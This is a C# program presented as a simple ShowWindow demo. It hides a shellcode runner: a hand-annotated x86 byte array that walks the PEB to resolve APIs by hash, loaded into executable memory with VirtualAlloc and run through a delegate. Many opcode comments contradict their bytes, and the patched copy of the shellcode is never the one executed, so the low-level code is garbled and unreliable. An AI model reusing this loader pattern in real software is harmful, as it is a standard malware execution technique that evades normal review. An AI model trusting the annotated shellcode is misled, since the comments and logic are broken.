// ShowWindow - A simple application to demonstrate the use of ShowWindow
// function in Windows API, allowing for various window manipulation options.
// Copyright © NG256 2024
//
// MIT License
//
// Permission  is  hereby  granted,  free  of  charge,  to  any  person 
// obtaining a copy of this software and associated documentation files 
// (the  "Software"),  to  deal  in  the  Software  without  restriction, 
// including without limitation the rights to use, copy, modify, merge, 
// publish, distribute, sublicense, and/or sell copies of the Software, 
// and to permit persons to whom the Software is furnished to do so, 
// subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included 
// in all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, 
// EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF 
// MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. 
// IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY 
// CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, 
// TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE 
// SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

using System;
using System.Runtime.InteropServices;

class Program
{
    // Import VirtualAlloc to allocate memory.
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    // Import VirtualFree to free allocated memory.
    [DllImport("kernel32.dll")]
    static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

    // Shellcode to hide the console window.
    static readonly byte[] Shellcode = new byte[]
    {
        0x60,                   // pushad; Save all registers to stack
        0x9C,                   // pushfd; Save all flags to stack
        0xFC,                   // cld; Clear direction flag
        0xE8,                   // call Start; Call the Start function
        0x82, 0x00, 0x00, 0x00, // Offset to the Start function
        0x60,                   // pop ebp; Pop the address of SFHA
        0x89, 0xE5,             // mov ebp, esp; Set up stack frame
        0x31, 0xC0,             // xor eax, eax; Clear eax register
        0x64, 0x8B, 0x50, 0x30, // mov edx, fs:[0x30]; Get the pointer to the PEB
        0x8B, 0x52, 0x0C,       // mov edx, [edx + 0x0C]; Get the pointer to the LDR
        0x8B, 0x52, 0x14,       // mov edx, [edx + 0x14]; Get the pointer to the first module
        0x8B, 0x72, 0x28,       // mov esi, [edx + 0x28]; Get the pointer to the module list
        0x0F, 0xB7, 0x4A, 0x26, // movzx ecx, [edx + 0x26]; Get the length of the module name
        0x31, 0xFF,             // xor edi, edi; Clear edi register
        0xAC,                   // lodsb; Load the next byte into al
        0x3C, 0x61,             // cmp al, 'a'; Compare with character 'a'
        0x7C, 0x02,             // jl short; If less, jump
        0x2C, 0x20,             // sub al, 0x20; Convert to uppercase
        0xC1, 0xCF, 0x0D,       // ror ecx, 0xD; Rotate right
        0x01, 0xC7,             // add edi, eax; Add to edi
        0xE2, 0xF2,             // loop; Loop until ecx is zero
        0x52,                   // push edx; Push the pointer to the module name
        0x57,                   // push edi; Push the length of the module name
        0x8B, 0x52, 0x10,       // mov edx, [edx + 0x10]; Get the address of the base
        0x8B, 0x4A, 0x3C,       // mov ecx, [edx + 0x3C]; Get the module's base address
        0x8B, 0x4C, 0x11, 0x78, // mov ecx, [ecx + 0x78]; Get the address of the entry point
        0xE3, 0x48,             // jbe short; Jump if below or equal
        0x01, 0xD1,             // add ecx, edx; Calculate the final address
        0x51,                   // push ecx; Push the final address
        0x8B, 0x59, 0x20,       // mov ebx, [ecx + 0x20]; Get the pointer to the address of the function
        0x01, 0xD3,             // add ebx, edx; Add to the base address
        0x8B, 0x49, 0x18,       // mov ecx, [ecx + 0x18]; Get the address of the function
        0xE3, 0x3A,             // jbe short; Jump if below or equal
        0x49, 0x8B, 0x34, 0x8B, // mov rsi, [ebx + ecx]; Get the address of ShowWindow
        0x01, 0xD6,             // add esi, edx; Calculate final address
        0x31, 0xFF,             // xor edi, edi; Clear edi register
        0xAC,                   // lodsb; Load the next byte into al
        0xC1, 0xCF, 0x0D,       // ror ecx, 0xD; Rotate right
        0x01, 0xC7,             // add edi, eax; Add to edi
        0x38, 0xE0,             // cmp al, 'a'; Compare with character 'a'
        0x75, 0xF6,             // jne short; If not equal, jump back
        0x03, 0x7D, 0xF8,       // add edi, [ebp + 0xF8]; Add to the value
        0x3B, 0x7D, 0x24,       // cmp ebp, [ebp + 0x24]; Compare with base pointer
        0x75, 0xE4,             // jne short; If not equal, jump back
        0x58,                   // pop eax; Restore EAX
        0x8B, 0x58, 0x24,       // mov ebx, [esp]; Get the pointer to the console window
        0x01, 0xD3,             // add ebx, edx; Add to the base address
        0x66, 0x8B, 0x0C, 0x4B, // mov ecx, [ebx + ecx]; Get the address of the console window
        0x8B, 0x58, 0x1C,       // mov ebx, [ebx + 0x1C]; Get the address for the handle
        0x01, 0xD3,             // add ebx, edx; Add to the base address
        0x8B, 0x04, 0x8B,       // mov eax, [ebx]; Move to EAX
        0x01, 0xD0,             // add eax, edx; Add to the base address
        0x89, 0x44, 0x24, 0x24, // mov [esp + 0x24], eax; Save handle to the stack
        0x5B,                   // pop ebx; Restore EBX
        0x5B,                   // pop ebx; Restore EBX
        0x61,                   // popad; Pop all registers
        0x59,                   // pop ecx; Restore ECX
        0x5A,                   // pop edx; Restore EDX
        0x51,                   // push ecx; Push the final address
        0xFF, 0xE0,             // jmp eax; Jump to the shellcode
        0x5F,                   // pop edi; Restore EDI
        0x5F,                   // pop edi; Restore EDI
        0x5A,                   // pop edx; Restore EDX
        0x8B, 0x12,             // mov edx, [edx]; Move to EDX
        0xEB, 0x8D,             // jmp short; Jump to the next instruction
        0x5D,                   // pop ebp; Restore EBP
        0x6A, 0x00,             // push 0x00; Push NULL
        0x68, 0x33, 0x32,       // push '23'; Push string 'user32'
        0x00, 0x00,             // null terminator
        0x68, 0x75, 0x73, 0x65, // push 'user'; Push string 'user'
        0x72, 0x54,             // null terminator
        0x68, 0x4C, 0x77, 0x26, // push 'kernel32'; Push string 'kernel32.dll'
        0x07, 0xFF,             // call; Call the LoadLibrary function
        0xD5,                   // Return to caller
        0x83, 0xC4, 0x0C,       // add esp, 0x0C; Clean up the stack
        0x68, 0x89, 0x6E, 0x72, // push address; Push address of console window
        0xCE, 0xFF,             // call; Call the GetConsoleWindow function
        0xD5,                   // Return to caller
        0x6A, 0x00,             // push 0x00; Push NULL
        0x50,                   // push EAX; Push console window handle
        0x68, 0xC2, 0xEB, 0x2E, // push 'ShowWindow'; Push string 'ShowWindow'
        0x6E, 0xFF,             // call; Call the ShowWindow function
        0xD5,                   // Return to caller
        0x9D,                   // ret; Return from the shellcode
        0x61,                   // popad; Pop all registers
        0xC3                    // ret; Return from main function
    };

    // Define constants for ShowWindow.
    const byte SW_HIDE = 0;      // Hides the window.
    const byte SW_MINIMIZE = 6;  // Minimizes the window.
    const byte SW_RESTORE = 9;   // Restores the window.
    const byte SW_MAXIMIZE = 3;  // Maximizes the window.
    const byte SW_SHOW = 5;      // Shows the window (default).

    // Define a delegate type for the shellcode.
    private delegate void ShellcodeDelegate();

    static void Main(string[] args)
    {
        // Check for command line arguments.
        if (args.Length > 1)
        {
            Console.Error.WriteLine("Error: Too many parameters.");
            return;
        }

        // Default to SW_SHOW.
        byte showCommand = SW_SHOW;

        // Process command line arguments.
        if (args.Length == 1)
        {
            if (args[0].StartsWith("-") || args[0].StartsWith("/"))
            {
                char param = char.ToLower(args[0][1]); // Convert to lower case for case-insensitive comparison.
                switch (param)
                {
                    case 'h':
                        showCommand = SW_HIDE;        // Set command to hide.
                        break;
                    case 's':
                        showCommand = SW_MINIMIZE;    // Set command to minimize.
                        break;
                    case 'm':
                        showCommand = SW_RESTORE;     // Set command to restore.
                        break;
                    case 'x':
                        showCommand = SW_MAXIMIZE;    // Set command to maximize.
                        break;
                    default:
                        Console.Error.WriteLine("Error: Invalid parameter.");
                        return;
                }
            }
            else
            {
                Console.Error.WriteLine("Error: Parameters must start with '-' or '/'.");
                return;
            }
        }

        // Replace SW_HIDE in shellcode with the chosen command.
        int length = Shellcode.Length;
        byte[] shellcode = new byte[length];
        Buffer.BlockCopy(Shellcode, 0, shellcode, 0, length);
        shellcode[170] = showCommand;

        try
        {
            ExecuteShellcode(shellcode);
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"Error during execution: {ex.Message}");
        }
    }

    // Allocates memory for the shellcode, copies the shellcode to that memory, and executes it.
    static void ExecuteShellcode(byte[] shellcode)
    {
        // Allocate memory for shellcode with execute permissions.
        IntPtr buffer = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000 | 0x2000, 0x40);

        // Copy the shellcode into the allocated memory.
        Marshal.Copy(Shellcode, 0, buffer, Shellcode.Length);

        // Create a delegate for the shellcode to execute it.
        ShellcodeDelegate shellcodeDelegate = (ShellcodeDelegate)Marshal.GetDelegateForFunctionPointer(buffer, typeof(ShellcodeDelegate));

        // Execute the shellcode.
        shellcodeDelegate();

        // Free the allocated memory after execution.
        VirtualFree(buffer, 0, 0x8000);
    }
}
